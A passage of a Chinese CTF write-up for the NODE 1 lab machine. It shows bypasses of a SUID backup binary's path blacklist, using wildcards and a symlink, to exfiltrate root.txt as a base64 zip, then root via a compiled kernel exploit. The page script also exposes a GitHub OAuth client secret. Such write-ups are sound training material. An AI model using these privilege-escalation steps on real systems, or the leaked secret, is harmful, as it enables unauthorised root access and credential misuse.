+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08049EC5 aRoot           db &apos;/root&apos;,0            ; DATA XREF: main+4DA↑o</span><br><span class="line">.rodata:08049ECB asc_8049ECB     db &apos;//&apos;,0               ; DATA XREF: main+675↑o</span><br><span class="line">.rodata:08049ECE asc_8049ECE     db &apos;/&apos;,0                ; DATA XREF: main+6BC↑o</span><br><span class="line">.rodata:08049ED0 aEtc            db &apos;/etc&apos;,0             ; DATA XREF: main+703↑o</span><br><span class="line">.rodata:08049ED5 aTmpBackupI     db &apos;/tmp/.backup_%i&apos;,0  ; DATA XREF: main+7B7↑o</span><br><span class="line">.rodata:08049EE5                 align 4</span><br><span class="line">.rodata:08049EE8 aUsrBinZipRPMag db &apos;/usr/bin/zip -r -P magicword %s %s &gt; /dev/null&apos;,0</span><br><span class="line">.rodata:08049EE8                                         ; DATA XREF: main+7D9↑o</span><br><span class="line">.rodata:08049F17 aUsrBinBase64W0 db &apos;/usr/bin/base64 -w0 %s&apos;,0</span><br><span class="line">.rodata:08049F17                                         ; DATA XREF: main+838↑o</span><br><span class="line">.rodata:08049F2E aTheTargetPathD db &apos;The target path doesn&apos;,27h,&apos;t exist&apos;,0</span><br><span class="line">.rodata:08049F2E                                         ; DATA XREF: main+869↑o</span><br><span class="line">.rodata:08049F2E _rodata         ends</span><br></pre></td></tr></table></figure>
+<ul>
+<li>现在就是想怎么绕过过滤。目前只想到了两种方法。</li>
+</ul>
+<ol>
+<li>Linux的通配符，用四个*代替root字符串，把返回的字符串解码用之前的密码解压就可以获取root目录下的root.txt文件了。其实在set里出题人已经提示了可以使用<code>_=&#39;/****/****.txt&#39;</code>的了。</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tom@node:/usr/local/bin$ ./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /****/****.txt</span><br><span class="line">&lt;4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /****/****.txt             </span><br><span class="line">UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWemtwFt1eAsAAQQAAAAABAAAAABV8jIoS5pVMDG/v8Ky96FxGnEzm7MYgoNnqV+uTwW4IcvmccY7RuN/o2FSD7RQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAAtom@node:/usr/local/bin$</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD echo "UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWemtwFt1eAsAAQQAAAAABAAAAABV8jIoS5pVMDG/v8Ky96FxGnEzm7MYgoNnqV+uTwW4IcvmccY7RuN/o2FSD7RQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA"|base64 -d &gt; 1.zip</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD unzip 1.zip -d /tmp</span><br><span class="line">Archive:  1.zip</span><br><span class="line">[1.zip] root/root.txt password: </span><br><span class="line"> extracting: /tmp/root/root.txt      </span><br><span class="line">➜  DOWNLOAD cat /tmp/root/root.txt </span><br><span class="line">1722e99ca5f353b362556a62bd5e6be0</span><br><span class="line">➜  DOWNLOAD</span><br></pre></td></tr></table></figure>
+<p>2.Linux里面的ln可以创建同步链接，只要把一个不在黑名单里的目录链接到root目录在打包备份这个目录就可以了。先到tmp目录随便创建一个文件夹，再软链接过去，打包备份得到和上面一样的效果。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>cd /tmp</span><br><span class="line">cd /tmp</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/tmp</span><span class="variable">$ </span>mkdir test</span><br><span class="line">mkdir test</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cd /usr/local/bin</span><br><span class="line">cd /usr/local/bin</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">backup</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>./backup -q <span class="number">45</span>fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 </span><br><span class="line">&lt;backup -q <span class="number">45</span>fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474  </span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>ln -s /root/root.txt /tmp/test/</span><br><span class="line">ln -s /root/root.txt /tmp/test/</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>./backup -q <span class="number">45</span>fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test/</span><br><span class="line">&lt;<span class="number">4</span>fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test/                 </span><br><span class="line">UEsDBAoAAAAAAEISTU0AAAAAAAAAAAAAAAAJABwAdG1wL3Rlc3QvVVQJAAPMR8Fb50fBW3V4CwABBOgDAAAE6AMAAFBLAwQKAAkAAADUfSNL8o43QC0AAAAhAAAAEQAcAHRtcC90ZXN0L3Jvb3QudHh0VVQJAAPQFaxZ6a3AW3V4CwABBAAAAAAEAAAAADkP/XbDOYEypwb9otRX3B70ByGgGe7HxtZxLnY3FwS0Sc1u71Mp/S+gUeYDWVBLBwjyjjdALQAAACEAAABQSwECHgMKAAAAAABCEk1NAAAAAAAAAAAAAAAACQAYAAAAAAAAABAA7UEAAAAAdG1wL3Rlc3QvVVQFAAPMR8FbdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAABEAGAAAAAAAAQAAAKCBQwAAAHRtcC90ZXN0L3Jvb3QudHh0VVQFAAPQFaxZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAACAAIApgAAAMsAAAAAAA==tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span>$</span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果是想快点的就上传EXP编译提权，这里就不说了。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/tmp$ uname -a</span><br><span class="line">Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD searchsploit 4.4.0 | grep local</span><br><span class="line">Comodo Backup 4.4.0.0 - Null Pointer De | exploits/windows/local/35905.c</span><br><span class="line">Linux 4.4.0 &lt; 4.4.0-53 - AF_PACKET choc | exploits/linux/local/44696.rb</span><br><span class="line">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04  | exploits/linux_x86-64/local/40871.c</span><br><span class="line">Linux Kernel 4.4.0 (Ubuntu) - DCCP Doub | exploits/linux/local/41458.c</span><br><span class="line">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64 | exploits/linux_x86-64/local/40049.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04. | exploits/linux/local/44298.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x | exploits/linux/local/44300.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (U | exploits/linux/local/43418.c</span><br><span class="line">PHP 4.4.0 - 'mysql_connect function' Lo | exploits/windows/local/1406.php</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD searchsploit -p 44298          </span><br><span class="line">  Exploit: Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/44298/</span><br><span class="line">     Path: /home/kali-team/Kali-Team/exploit-database/exploits/linux/local/44298.c</span><br><span class="line">File Type: C source, ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD </span><br><span class="line">➜  DOWNLOAD scp /home/kali-team/Kali-Team/exploit-database/exploits/linux/local/44298.c mark@192.168.131.141:/tmp</span><br><span class="line">mark@192.168.131.141's password: </span><br><span class="line">44298.c                                                              100% 6021     9.5MB/s   00:00</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/tmp$ ls</span><br><span class="line">44298.c             systemd-private-1e2dccb30d5c4421ab0156f380ae24f2-systemd-timesyncd.service-XxCCZ4</span><br><span class="line">mongodb-27017.sock  test</span><br><span class="line">shell.sh            vmware-root</span><br><span class="line">mark@node:/tmp$ gcc 44298.c </span><br><span class="line">mark@node:/tmp$ ./a.out </span><br><span class="line">task_struct = ffff88002d8fda00</span><br><span class="line">uidptr = ffff88002ad330c4</span><br><span class="line">spawning root shell</span><br><span class="line">root@node:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(mark)</span><br><span class="line">root@node:/tmp#</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            <a class="cat-link" href="/categories/CTF/">CTF</a>
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/CTF/" title="CTF">CTF</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br>
+        <a href="/2018/10/16/Write-up-wakanda-1/">
+            
+                Write-Up-wakanda-1
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br>
+        <a href="/2018/10/10/Write-up-Bob-v1-0-1/">
+            
+                Write-up-Bob_v1.0.1
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+  <script src="/js/comment.js"></script>
+  <div id="comments" class="comment">
+    <!--
+    <div class="sign-bar">
+      GitHub 已登录!
+      <span class="sign-link">登出</span>
+    </div>
+    <section class="box">
+      <div class="com-avatar"><img src="/img/favicon.ico" alt="avatar"></div>
+      <div class="com-text">
+        <div class="main">
+          <textarea class="text-area-edited show" placeholder="欢迎评论！"></textarea>
+          <div class="text-area-preview"></div>
+        </div>
+        <div class="switch">
+          <div class="switch-item on">编辑</div>
+          <div class="switch-item">预览</div>
+        </div>
+        <div class="button">提交</div>
+      </div>
+    </section>
+    <section class="tips">注：评论支持 markdown 语法！</section>
+    <section class="list-wrap">
+      <ul class="list">
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">张德龙</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like liked">已赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">333333</div>
+          </div>
+        </li>
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">刘德华</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like">点赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">vvvvv</div>
+          </div>
+        </li>
+      </ul>
+      <div class="page-nav">
+        <a href="javascript: void(0);" class="item">1</a>
+        <a href="javascript: void(0);" class="item">2</a>
+        <a href="javascript: void(0);" class="item current">3</a>
+      </div>
+    </section>
+    -->
+  </div>
+  <script>
+  JELON.Comment({
+    container: 'comments',
+    label: 'Write-up-NODE-1' || '2018/10/12/Write-up-NODE-1/',
+    owner: 'cn-kali-team',
+    repo: 'cn-kali-team.github.io',
+    clientId: '0683bca9d762208912a9',
+    clientSecret: 'fd3e06918ff647fd4b347dfeba033b588a957fc5'
+  });
+  </script>
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/Arch/">Arch</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/工具/">工具</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CTF/">CTF</a>
+        <span class="badge">(11)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Web/">Web</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/Arch/" title="Arch">Arch (1)</a>
+  
+    <a class="tag-item" href="/tags/Genymotion/" title="Genymotion">Genymotion (1)</a>
+  
+    <a class="tag-item" href="/tags/CTF/" title="CTF">CTF (11)</a>
+  
+    <a class="tag-item" href="/tags/XSS/" title="XSS">XSS (1)</a>
+  
+    <a class="tag-item" href="/tags/web/" title="web">web (1)</a>
+  
+    <a class="tag-item" href="/tags/Linux/" title="Linux">Linux (1)</a>
+  
+    <a class="tag-item" href="/tags/nmap/" title="nmap">nmap (1)</a>
+  
+    <a class="tag-item" href="/tags/metasploit/" title="metasploit">metasploit (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://gh0st.cn/" target="_blank" title="陈的博客">VulKey</a>
+        </li>
+    
+        <li>
+            <a href="https://10miaomiao.cn/" target="_blank" title="10喵喵的世界">飞跃</a>
+        </li>
+    
+        <li>
+            <a href="http://www.zmnihao.cn/" target="_blank" title="梓铭你好">梓铭</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2019
+    
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+<script src="/js/main.js"></script>
+</body>
+</html>
